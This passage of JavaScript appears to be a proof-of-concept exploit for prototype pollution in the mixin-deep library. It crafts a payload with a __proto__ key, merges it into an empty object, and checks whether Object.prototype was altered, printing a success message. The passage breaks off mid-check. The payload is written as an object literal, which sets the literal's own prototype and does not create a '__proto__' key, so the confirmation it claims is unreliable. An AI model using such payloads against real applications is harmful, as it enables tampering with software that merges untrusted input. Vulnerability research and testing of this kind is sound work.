  // In vulnerable versions, the library blindly assigns this key to the target object.
  const maliciousPayload = { __proto__: { exploited: 'yes' } };

  // Trigger the merge operation against a neutral empty object
  mixinDeep({}, maliciousPayload);

  // Verify if Object.prototype was mutated during the merge
  if ({}.exploited === 'yes') {
    console.log("[+] POC Verified: Prototype Pollution Confirmed.");
    console.log("    Object.prototype.exploited is now set to:", {}.exploited);

